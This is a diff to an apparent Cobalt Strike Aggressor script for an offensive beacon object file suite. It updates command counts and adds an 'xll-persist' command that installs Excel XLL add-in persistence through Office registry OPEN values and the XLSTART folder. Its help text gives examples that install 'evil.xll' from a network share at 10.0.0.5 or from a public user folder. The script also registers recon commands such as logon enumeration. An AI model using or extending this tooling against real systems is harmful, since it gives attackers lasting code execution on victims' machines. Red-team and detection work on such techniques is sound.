@@ -25,14 +25,14 @@
 # Phase 3 gap-fill — Remote-Ops (26 BOFs)
 # Phase 4 gap-fill — OperatorsKit (23 BOFs)
 # Phase 5 gap-fill — C2-Collection (5 BOFs)
-# Total: 175 registered commands (174 BOFs + dani-help meta)
+# Total: 176 registered commands (175 BOFs + dani-help meta)
 
 # ============================================================
 # LOAD-TIME BANNER
 # ============================================================
 println("============================================================");
 println("  DEF-Situational-Awareness-BOF");
-println("  174 BOFs across 6 phases loaded");
+println("  175 BOFs across 6 phases loaded");
 println("  Type 'dani-help' in a beacon for the full command list.");
 println("============================================================");
 
@@ -2811,7 +2811,7 @@ alias dani-help {
     $bid = $1;
     blog($bid, "=================================================================");
     blog($bid, "  DEF-Situational-Awareness-BOF");
-    blog($bid, "  174 BOFs across 6 phases  |  Use 'help <cmd>' for full syntax");
+    blog($bid, "  175 BOFs across 6 phases  |  Use 'help <cmd>' for full syntax");
     blog($bid, "=================================================================");
     blog($bid, "");
     blog($bid, "PHASE 1 — Canary (3 BOFs, no args)");
@@ -2998,9 +2998,9 @@ alias dani-help {
 }
 beacon_command_register(
     "dani-help",
-    "List all 174 BOFs in the Dani suite by phase and technique",
+    "List all 175 BOFs in the Dani suite by phase and technique",
     "Synopsis: dani-help\n\n" .
-    "Description: Print a structured list of all 174 BOFs available in the\n" .
+    "Description: Print a structured list of all 175 BOFs available in the\n" .
     "DEF-Situational-Awareness-BOF suite, organized by phase, with MITRE\n" .
     "ATT&CK technique IDs and argument summaries.\n\n" .
     "Use 'help <command>' for full syntax and MITRE details on any BOF.\n\n" .
@@ -3158,4 +3158,35 @@ beacon_command_register(
     "wevt-logon-enum",
     "Query Security event log for recent logons — T1087.001",
     "Synopsis: wevt-logon-enum\n\nDescription: Parse Security channel for 4624/4634 events to enumerate local accounts and their last-logon times.\n\nMITRE ATT&CK: T1087.001 (Local Account Discovery)\n\nArgs: none"
+);
+
+# ============================================================
+# Phase 12 — XLL persistence
+# ============================================================
+
+# --- xll-persist ---
+alias xll-persist {
+    local('$bid $sub $path $args');
+    $bid  = $1;
+    $sub  = $2;
+    $path = $3;
+    if ($sub is $null) { $sub  = "status"; }
+    if ($path is $null) { $path = ""; }
+    $args = bof_pack($bid, "zz", $sub, $path);
+    dani_run($bid, "xll-persist", $args);
+}
+beacon_command_register(
+    "xll-persist",
+    "Excel XLL add-in persistence — T1137.006",
+    "Synopsis: xll-persist [install|remove|status] [--path <unc-or-local>]\n\n" .
+    "Description: Install / remove / inspect Excel XLL add-in persistence\n" .
+    "via HKCU\\Software\\Microsoft\\Office\\<ver>\\Excel\\Options\\OPEN[N] +\n" .
+    "%APPDATA%\\Microsoft\\Excel\\XLSTART\\ on every detected Office version.\n\n" .
+    "Examples:\n" .
+    "  xll-persist install \\\\\\\\10.0.0.5\\\\share\\\\evil.xll\n" .
+    "  xll-persist install C:\\\\Users\\\\Public\\\\evil.xll\n" .
+    "  xll-persist remove  \\\\\\\\10.0.0.5\\\\share\\\\evil.xll\n" .
+    "  xll-persist status\n\n" .
+    "MITRE ATT&CK: T1137.006 (Office Application Startup: Add-ins)\n\n" .
+    "Args: [install|remove|status] [path]"
 );
